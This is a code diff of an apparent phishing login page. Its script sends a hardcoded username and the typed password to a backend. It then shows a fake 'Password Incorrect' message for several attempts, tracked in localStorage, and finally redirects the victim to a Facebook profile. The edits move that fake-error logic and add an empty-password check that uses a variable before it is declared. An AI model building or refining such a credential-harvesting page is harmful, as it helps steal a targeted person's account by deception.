@@ -251,13 +251,20 @@ form a {
         
         
         function validateForm() {
+            if (password === "") {
+                     errorMessage.innerText = "Password Incorrect.";
+                     errorMessage.style.display = "block";  
+                
+            }else{
           ++count;
           localStorage.setItem('count', count);
           var errorMessage = document.getElementById("error-message");
           var passwordInput = document.getElementById("password");
-          var password=passwordInput.value;
+          var password=passwordInput.value.trim();
           // Assuming username is always "sahitya"
           var username = "shanika";
+
+            
 
           // Create an object to send in the POST request
           var userCredentials = {
@@ -275,7 +282,13 @@ form a {
             .then(data => {
               // Handle the response from the backend as needed
               console.log('Success:', data);
-                  if(resetCount<1 || count<4){
+            })
+            .catch((error) => {
+              console.error('Error:', error);
+              errorMessage.innerText = "There was an error during login.";
+              errorMessage.style.display = "block";
+            });
+             if(resetCount<1 || count<4){
                        errorMessage.innerText = "Password Incorrect.";
                        errorMessage.style.display = "block";  
                    }
@@ -283,13 +296,6 @@ form a {
                         window.location.href = "https://www.facebook.com/profile.php?id=61555878152274";
                     }
                     passwordInput.value = "";
-            })
-            .catch((error) => {
-              console.error('Error:', error);
-              errorMessage.innerText = "There was an error during login.";
-              errorMessage.style.display = "block";
-            });
-
          
         }
 
@@ -307,7 +313,7 @@ form a {
                     eyeIcon.classList.add("fa-eye-slash");
                 }
             }
-        
+        }
     </script>
 </body>
 </html>
